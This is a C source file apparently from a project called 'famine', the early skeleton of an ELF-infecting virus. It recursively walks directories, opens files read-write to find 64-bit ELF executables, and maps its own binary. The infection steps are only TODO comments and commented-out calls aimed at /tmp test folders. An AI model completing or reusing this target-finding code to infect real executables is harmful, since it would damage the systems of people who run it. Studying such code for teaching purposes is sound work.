#include "famine.h"

int			check_file(void *addr)
{
	Elf64_Ehdr		*header;
	unsigned char	magic[EI_NIDENT];

	if (DEBUG)
		printf("%scheck_file%s()\n", _BLUE, _END);
	header = addr;
	memcpy(magic, addr, sizeof(magic));
	if ((magic[EI_MAG0] == ELFMAG0) &&
		(magic[EI_MAG1] == ELFMAG1) &&
		(magic[EI_MAG2] == ELFMAG2) &&
		(magic[EI_MAG3] == ELFMAG3))
	{
		if (magic[EI_CLASS] == ELFCLASS64)
			return (header->e_type);
	}
	return (ET_NONE);
}

void	moving_through_path(char *path)
{
	DIR		*dir;
    struct	dirent *d;
	int		size;
	char	*new_path;

	if (DEBUG)
		printf("%smoving_through_path%s()\n", _BLUE, _END);
	dir = opendir(path);
	if (dir)
	{
		while ((d = readdir(dir)))
		{
			if (strcmp(d->d_name, ".") && strcmp(d->d_name, ".."))
			{
				size = strlen(path) + strlen(d->d_name) + 2;
				new_path = malloc(size);
				bzero(new_path, size);
				strcpy(new_path, path);
				strcat(new_path, "/");
				strcat(new_path, d->d_name);
				if (d->d_type == DT_DIR)
					moving_through_path(new_path);
				else if (strcmp(d->d_name, ".") && strcmp(d->d_name, ".."))
				{
					int				fd;
					void			*header[64];
					int				ret;

					fd = open(new_path, O_RDWR);
					if (fd > 0)
					{
						ret = read(fd, header, 64);
						if (ret >= 0)
						{
							ret = check_file(header);
							if (ret == ET_EXEC || ret == ET_DYN)
								printf("%s: %s\n", new_path, "good elf file");
							//else
							//	printf("%s: %s\n", new_path, "not a elf file");
						}
						else
						{
							printf("%s\n", strerror(errno));
						}
						close(fd);
					}
				}
				free(new_path);
			}
		}
		closedir(dir);
	}
	else
	{
		printf("%s: %s\n", path, strerror(errno));
	}
}

int		main(int argc, char *argv[])
{
	int		fd;
	int		ret;
	t_elf	elf;

	if (DEBUG)
		printf("%smain%s()\n", _BLUE, _END);
	if (DEBUG)
		debug_print_args(argc, argv);
	fd = open(argv[0], O_RDONLY);
	if (fd > 0)
	{
		/* TODO: Original infection
			Copy the whole file
		*/
		elf.size = lseek(fd, (size_t)0, SEEK_END);
		if (elf.size < 0 ||
(elf.addr = mmap(NULL, elf.size, PROT_READ, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
		{
			close(fd);
			if (DEBUG)
				debug_print_error(0, argv[0], argv[0]);
			return (1);
		}
		if ((ret = init_elf(&elf, elf.addr, elf.size)) < 0)
		{
			close(fd);
			if (DEBUG)
				debug_print_error(ret, argv[0], argv[0]);
		}
		if (DEBUG)
			debug_print_elf(&elf);
		munmap(elf.addr, elf.size);
		// TODO: Host infection
		/*
		moving_through_path("/tmp/test");
		moving_through_path("/tmp/test2");
		*/
		close(fd);
	}
	return (0);
}
